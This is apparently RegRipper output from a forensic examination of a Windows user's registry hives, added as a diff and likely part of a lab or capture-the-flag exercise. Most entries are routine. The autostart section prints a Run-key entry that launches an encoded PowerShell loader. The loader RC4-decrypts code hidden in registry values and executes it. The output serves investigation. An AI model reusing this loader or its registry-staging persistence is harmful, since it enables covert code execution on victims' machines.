+
+load value not found.
+run value not found.
+----------------------------------------
+logonstats v.20200517
+Gets contents of user's LogonStats key
+
+FirstLogonTime                     :  Mon Apr 11 14:18:04 2022
+FirstLogonTimeOnCurrentInstallation:  Mon Apr 11 14:18:04 2022
+----------------------------------------
+lxss v.20200511
+(NTUSER.DAT) Gets WSL config.
+
+Software\Microsoft\Windows\CurrentVersion\Lxss not found.
+----------------------------------------
+mixer v.20200517
+(NTUSER.DAT) Checks user's audio mixer settings
+
+LastWrite Time, App, Device GUID
+2022-04-11 15:04:07Z,#,\\?\hdaudio#func_01&ven_8384&dev_7680&subsys_83847680&rev_1034#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\espeakertopo/00010001
+----------------------------------------
+mmc v.20200517
+(NTUSER.DAT) Get contents of user's MMC\Recent File List key
+
+Software\Microsoft\Microsoft Management Console\Recent File List not found.
+----------------------------------------
+mmo v.20200517
+(NTUSER.DAT) Checks NTUSER for Multimedia\Other values [malware]
+
+Software\Microsoft\Multimedia\Other not found.
+Software\Microsoft\CTF\LangBarAddIn not found.
+----------------------------------------
+mndmru v.20200517
+(NTUSER.DAT) Get contents of user's Map Network Drive MRU
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU not found.
+----------------------------------------
+mp2 v.20200526
+(NTUSER.DAT) Gets user's MountPoints2 key contents
+
+MountPoints2
+Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
+LastWrite Time 2022-04-11 14:50:16Z
+
+Remote Drives:
+
+Volumes:
+2022-04-11 14:50:16Z
+  {45503c61-0000-0000-0000-300300000000}
+  {87558974-3f59-11ec-ae0b-806e6f6e6963}
+
+Drives:
+2022-04-11 14:18:04Z - CPC
+
+Unique MAC Addresses:
+80:6E:6F:6E:69:63
+30:03:00:00:00:00
+
+Analysis Tip: Correlate the Volume entries to those found in the MountedDevices
+entries that begin with "\??\Volume".
+----------------------------------------
+mpmru v.20200517
+(NTUSER.DAT) Gets user's Media Player RecentFileList values
+
+Software\Microsoft\MediaPlayer\Player\RecentFileList not found.
+----------------------------------------
+msoffice v.20200518
+
+----------------------------------------
+muicache v.20200525
+(NTUSER.DAT,USRCLASS.DAT) Gets EXEs from user's MUICache key
+
+Software\Microsoft\Windows\ShellNoRoam\MUICache not found.
+
+Local Settings\Software\Microsoft\Windows\Shell\MUICache not found.
+----------------------------------------
+nation v.20200517
+(ntuser.dat) Gets region information from HKCU
+
+Nation Information Check
+Control Panel\International\Geo
+LastWrite time: 2022-04-11 14:18:01Z
+
+The Region value is : 244
+The Country Is: United States
+For more information please visit the link below:
+https://msdn.microsoft.com/en-us/library/aa723531.aspx
+
+----------------------------------------
+oisc v.20091125
+(NTUSER.DAT) Gets contents of user's Office Internet Server Cache
+
+Office Version: 
+Software\Microsoft\Office\\Common\Internet\Server Cache not found.
+----------------------------------------
+onedrive v.20200515
+(NTUSER.DAT) Gets contents of user's OneDrive key
+
+Software\Microsoft\OneDrive
+UserFolder                : C:\Users\greth\OneDrive
+----------------------------------------
+OSVersion
+Software\Microsoft
+LastWrite Time 2022-04-11 15:23:27Z
+
+OSVersion value not found.
+----------------------------------------
+outlookhomepage v.20201002
+(NTUSER.DAT, Software) Retrieve values set to attack Outlook WebView Homepage
+
+Looking for webview homepage modifications. If this value is pointing
+to a URL outside the corporate domain it may be a malicious site.
+
+Looking for key values associated with security.
+If you see:
+[Example]  EnableRoamingFolderHomepages : 1
+[Example]  NonDefaultStoreScript : 1
+[Example]  EnableUnsafeClientMailRules : 1
+You may have a security vulnerability that allows attackers to hijack the URL
+
+----------------------------------------
+pendinggpos v.20200427
+NTUSER.DAT - Gets contents of user's PendingGPOs key
+
+Software\Microsoft\IEAK\GroupPolicy\PendingGPOs not found.
+----------------------------------------
+profiler v.20200525
+(NTUSER.DAT, System) Environment profiler information
+
+Environment
+LastWrite Time 2022-04-11 14:24:40Z
+
+Path -> %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
+TEMP -> %USERPROFILE%\AppData\Local\Temp
+TMP -> %USERPROFILE%\AppData\Local\Temp
+OneDrive -> C:\Users\greth\OneDrive
+
+----------------------------------------
+pslogging v.20200515
+(NTUSER.DAT, Software) Extracts PowerShell logging settings
+
+Software\Policies\Microsoft\Windows\PowerShell not found.
+Policies\Microsoft\Windows\PowerShell not found.
+----------------------------------------
+----------------------------------------
+putty v.20200515
+(NTUSER.DAT) Extracts the saved SshHostKeys for PuTTY.
+
+Software\SimonTatham\PuTTY\SshHostKeys not found.
+
+----------------------------------------
+recentapps v.20200515
+- Gets contents of user's RecentApps key
+
+Software\Microsoft\Windows\CurrentVersion\Search\RecentApps not found.
+----------------------------------------
+recentdocs v.20200427
+(NTUSER.DAT) Gets contents of user's RecentDocs key
+
+RecentDocs
+**All values printed in MRUList\MRUListEx order.
+Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
+LastWrite Time: 2022-04-11 14:25:15Z
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs has no subkeys.
+----------------------------------------
+run v.20200511
+(Software, NTUSER.DAT) [Autostart] Get autostart key contents from Software hive
+
+Software\Microsoft\Windows\CurrentVersion\Run
+LastWrite Time 2022-04-11 15:22:44Z
+  MicrosoftEdgeAutoLaunch_DD24A963A954FE25E19A66613DE0BF01 - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start /prefetch:5
+  OneDrive - "C:\Users\greth\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+  Vh0F75DQu - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc ZgB1AG4AYwB0AGkAbwBuACAAZQBuAGMAcgAgAHsACgAgACAAIAAgAHAAYQByAGEAbQAoAAoAIAAgACAAIAAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGQAYQB0AGEALAAKACAAIAAgACAAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABrAGUAeQAKACAAIAAgACAAIAAgACkACgAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGQAYQB0AGEALgBMAGUAbgBnAHQAaAAKACAAIAAgACAAJABkAGEAdABhAC4AQwBvAHAAeQBUAG8AKAAkAGIAdQBmAGYAZQByACwAIAAwACkACgAgACAAIAAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADIANQA2ADsACgAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGsAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMgA1ADYAOwAKACAACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcwBbACQAaQBdACAAPQAgAFsAQgB5AHQAZQBdACQAaQA7AAoAIAAgACAAIAAgACAAIAAgACQAawBbACQAaQBdACAAPQAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAagAgAD0AIAAwADsACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQAgACsAIAAkAGsAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAaQAgAD0AIAAkAGoAIAA9ACAAMAA7AAoAIAAgACAAIABmAG8AcgAgACgAJAB4ACAAPQAgADAAOwAgACQAeAAgAC0AbAB0ACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoADsAIAAkAHgAKwArACkACgAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAJABpACAAPQAgACgAJABpACAAKwAgADEAKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAIAAgACAAIABbAGkAbgB0AF0AJAB0ACAAPQAgACgAJABzAFsAJABpAF0AIAArACAAJABzAFsAJABqAF0AKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAYgB1AGYAZgBlAHIAWwAkAHgAXQAgAD0AIAAkAGIAdQBmAGYAZQByAFsAJAB4AF0AIAAtAGIAeABvAHIAIAAkAHMAWwAkAHQAXQA7AAoAIAAgACAAIAB9AAoAIAAKACAAIAAgACAAcgBlAHQAdQByAG4AIAAkAGIAdQBmAGYAZQByAAoAfQAKAAoACgBmAHUAbgBjAHQAaQBvAG4AIABIAGUAeABUAG8AQgBpAG4AIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AKAAKACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAAoAIAAgACAAIAAgACAAIAAgAFAAbwBzAGkAdABpAG8AbgA9ADAALAAgAAoAIAAgACAAIAAgACAAIAAgAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACwAIAAKACAAIAAgACAAIAAgACAAIABWAGEAbAB1AGUARgByAG8AbQBQAGkAcABlAGwAaQBuAGUAPQAkAHQAcgB1AGUAKQAKACAAIAAgACAAXQAgACAAIAAKACAAIAAgACAAWwBzAHQAcgBpAG4AZwBdACQAcwApAAoAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAPQAgAEAAKAApAAoAIAAgACAAIAAKACAAIAAgACAAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAcwAuAEwAZQBuAGcAdABoACAAOwAgACQAaQAgACsAPQAgADIAKQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAKwA9ACAAWwBCAHkAdABlAF0AOgA6AFAAYQByAHMAZQAoACQAcwAuAFMAdQBiAHMAdAByAGkAbgBnACgAJABpACwAIAAyACkALAAgAFsAUwB5AHMAdABlAG0ALgBHAGwAbwBiAGEAbABpAHoAYQB0AGkAbwBuAC4ATgB1AG0AYgBlAHIAUwB0AHkAbABlAHMAXQA6ADoASABlAHgATgB1AG0AYgBlAHIAKQAKACAAIAAgACAAfQAKACAAIAAgACAACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJAByAGUAdAB1AHIAbgAKAH0ACgAKAFsAQgB5AHQAZQBbAF0AXQAkAGsAZQB5ACAAPQAgACQAZQBuAGMALgBHAGUAdABCAHkAdABlAHMAKAAiAFEAMABtAG0AcAByADQAQgA1AHIAdgBaAGkAMwBwAFMAIgApAAoAJABlAG4AYwByAHkAcAB0AGUAZAAxACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAFoAWQBiADcAOABQADQAcwApAC4AdAAzAFIAQgBrAGEANQB0AEwACgAkAGUAbgBjAHIAeQBwAHQAZQBkADIAIAA9ACAAKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAQgBqAHEAQQB0AEkAZQBuACkALgB1AEwAbAB0AGoAagBXAAoAJABlAG4AYwByAHkAcAB0AGUAZAAzACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAEEAcABwAEQAYQB0AGEATABvAHcAXAB0ADAAMwBBADEAUwB0AHEAKQAuAHUAWQA0AFMAMwA5AEQAYQAKACQAZQBuAGMAcgB5AHAAdABlAGQANAAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABHAG8AbwBnAGwAZQBcAE4AdgA1ADAAegBlAEcAKQAuAEsAYgAxADkAZgB5AGgAbAAKACQAZQBuAGMAcgB5AHAAdABlAGQANQAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABBAHAAcABFAHYAZQBuAHQAcwBcAEoAeAA2ADYAWgBHADAATwApAC4AagBIADUANABOAFcAOABDAAoAJABlAG4AYwByAHkAcAB0AGUAZAAgAD0AIAAiACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADEAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAAyACkAJAAoACQAZQBuAGMAcgB5AHAAdABlAGQAMwApACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADQAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAA1ACkAIgAKACQAZQBuAGMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAAoAWwBCAHkAdABlAFsAXQBdACQAZABhAHQAYQAgAD0AIABIAGUAeABUAG8AQgBpAG4AIAAkAGUAbgBjAHIAeQBwAHQAZQBkAAoAJABEAGUAYwByAHkAcAB0AGUAZABCAHkAdABlAHMAIAA9ACAAZQBuAGMAcgAgACQAZABhAHQAYQAgACQAawBlAHkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnACAAPQAgACQAZQBuAGMALgBHAGUAdABTAHQAcgBpAG4AZwAoACQARABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnAHwAaQBlAHgA
+
+
+Software\Microsoft\Windows\CurrentVersion\Run\Vh0F75DQu
+LastWrite Time 2022-04-11 15:10:04Z
+
+Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run not found.
+
+Software\Microsoft\Windows\CurrentVersion\RunOnce
+LastWrite Time 2022-04-11 15:04:37Z
+Software\Microsoft\Windows\CurrentVersion\RunOnce has no values.
+Software\Microsoft\Windows\CurrentVersion\RunOnce has no subkeys.
+
+Software\Microsoft\Windows\CurrentVersion\RunServices not found.
+
+Software\Microsoft\Windows\CurrentVersion\RunServicesOnce not found.
+
+Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run not found.
+
+Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce not found.
+
+Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run not found.
+
+Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run not found.
+
+Software\Microsoft\Windows\CurrentVersion\StartupApproved\Run not found.
+
+Software\Microsoft\Windows\CurrentVersion\StartupApproved\Run32 not found.
+
+Software\Microsoft\Windows\CurrentVersion\StartupApproved\StartupFolder not found.
+
+----------------------------------------
+runmru v.20200525
+(NTUSER.DAT) Gets contents of user's RunMRU key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU not found.
+----------------------------------------
+runvirtual v.20200427
+(NTUSER.DAT, Software) Gets RunVirtual entries
+
+----------------------------------------
+searchscopes v.20200517
+- Gets contents of user's SearchScopes key
+
+Software\Microsoft\Internet Explorer\SearchScopes not found.
+----------------------------------------
+sevenzip v.20210329
+- Gets records of histories from 7-Zip keys
+
+Software\7-Zip not found.
+Software\Wow6432Node\7-Zip not found.
+----------------------------------------
+shc v.20200427
+(NTUSER.DAT) Gets SHC entries from user hive
+
+Software\Microsoft\Windows\CurrentVersion\UFH\SHC
+LastWrite Time 2022-04-11 14:51:09Z
+
+0 - C:\Users\greth\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Oracle VM VirtualBox Guest Additions\Uninstall.lnk C:\Program Files\Oracle\VirtualBox Guest Additions\uninst.exe 
+----------------------------------------
+shellfolders v.20200515
+Gets user's shell folders values
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+LastWrite Time 2022-04-11 14:18:10Z
+StartUp folder : C:\Users\greth\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+LastWrite Time 2022-04-11 14:18:01Z
+StartUp folder : %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+----------------------------------------
+speech v.20200427
+(NTUSER.DAT) Get values from user's Speech key
+
+Software\Microsoft\Speech
+----------------------------------------
+Software\SysInternals not found.
+----------------------------------------
+Launching tsclient v.20200518
+(NTUSER.DAT) Displays contents of user's Terminal Server Client\Default key
+
+Software\Microsoft\Terminal Server Client\Default not found.
+
+Software\Microsoft\Terminal Server Client\Servers not found.
+----------------------------------------
+typedpaths v.20200526
+(NTUSER.DAT) Gets contents of user's typedpaths key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths not found.
+----------------------------------------
+typedurls v.20200526
+(NTUSER.DAT) Returns contents of user's TypedURLs key.
+
+TypedURLs
+Software\Microsoft\Internet Explorer\TypedURLs
+LastWrite Time 2022-04-11 15:04:07Z
+  url1 -> http://go.microsoft.com/fwlink/p/?LinkId=255141
+----------------------------------------
+typedurlstime v.20200526
+(NTUSER.DAT) Returns contents of user's TypedURLsTime key.
+
+Software\Microsoft\Internet Explorer\TypedURLsTime not found.
+----------------------------------------
+uninstall v.20200525
+(Software, NTUSER.DAT) Gets contents of Uninstall keys from Software, NTUSER.DAT hives
+
+Uninstall
+Software\Microsoft\Windows\CurrentVersion\Uninstall
+
+2022-04-11 14:24:40Z
+  Microsoft OneDrive v.21.220.1024.0005
+
+----------------------------------------
+UserAssist
+Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
+LastWrite Time 2022-04-11 14:18:07Z
+
+{9E04CAB2-CC14-11DF-BB8C-A2F1DED72085}
+
+{A3D53349-6E61-4557-8FC7-0028EDCEEBF6}
+
+{B267E3AD-A825-4A09-82B9-EEC22AA3B847}
+
+{BCB48336-4DDD-48FF-BB0B-D3190DACB3E2}
+
+{CAA59E3C-4792-41A5-9909-6A6A8D32490E}
+
+{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
+2022-04-11 15:22:32Z
+  MSEdge (1)
+2022-04-11 15:10:16Z
+  {F38BF404-1D43-42F2-9305-67DE0B28FC23}\regedit.exe (2)
+2022-04-11 15:09:38Z
+  Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI (1)
+2022-04-11 15:04:44Z
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\cmd.exe (1)
+2022-04-11 14:50:25Z
+  D:\VBoxWindowsAdditions.exe (1)
+2022-04-11 14:50:13Z
+  Microsoft.Windows.Explorer (2)
+2022-04-11 14:16:33Z
+  Microsoft.Getstarted_8wekyb3d8bbwe!App (14)
+  Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App (13)
+  Microsoft.WindowsMaps_8wekyb3d8bbwe!App (12)
+  Microsoft.People_8wekyb3d8bbwe!x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x (11)
+  Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App (10)
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\SnippingTool.exe (9)
+  Microsoft.WindowsCalculator_8wekyb3d8bbwe!App (8)
+  {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\mspaint.exe (7)
+
+Value names with no time stamps:
+  UEME_CTLCUACount:ctor
+  Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy!App
+  Microsoft.Windows.Search_cw5n1h2txyewy!CortanaUI
+  Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy!App
+  Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy!App
+  D:\VBoxWindowsAdditions-amd64.exe
+  C:\Users\greth\AppData\Local\Temp\{96D7E452-C122-4445-85CE-DF34C538563B}\ftkimager.exe
+
+{F2A1CB5A-E3CC-4A2E-AF9D-505A7009D442}
+
+{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}
+2022-04-11 15:22:32Z
+  {9E3995AB-1F9C-4F13-B827-48B24B6C7174}\TaskBar\Microsoft Edge.lnk (1)
+2022-04-11 15:10:16Z
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Administrative Tools\Registry Editor.lnk (2)
+2022-04-11 15:04:44Z
+  {A77F5D77-2E2B-44C3-A6A2-ABA601054A51}\System Tools\Command Prompt.lnk (1)
+2022-04-11 14:50:13Z
+  {9E3995AB-1F9C-4F13-B827-48B24B6C7174}\TaskBar\File Explorer.lnk (2)
+2022-04-11 14:16:33Z
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Snipping Tool.lnk (9)
+  {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}\Accessories\Paint.lnk (7)
+
+Value names with no time stamps:
+  UEME_CTLCUACount:ctor
+
+{FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD}
+
+----------------------------------------
+wc_shares v.20200515
+- Gets contents of user's WorkgroupCrawler/Shares subkeys
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares not found.
+----------------------------------------
+winrar v.20200526
+(NTUSER.DAT) Get WinRAR\ArcHistory entries
+
+Software\WinRAR\ArcHistory not found.
+----------------------------------------
+winscp v.20201227
+(NTUSER.DAT) Gets user's WinSCP 2 data
+
+Software\Martin Prikryl\WinSCP 2 not found.
+----------------------------------------
+winzip v.20200526
+(NTUSER.DAT) Get WinZip extract and filemenu values
+
+Software\Nico Mak Computing\WinZip not found.
+----------------------------------------
+wordwheelquery v.20200823
+(NTUSER.DAT) Gets contents of user's WordWheelQuery key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery not found.
+----------------------------------------
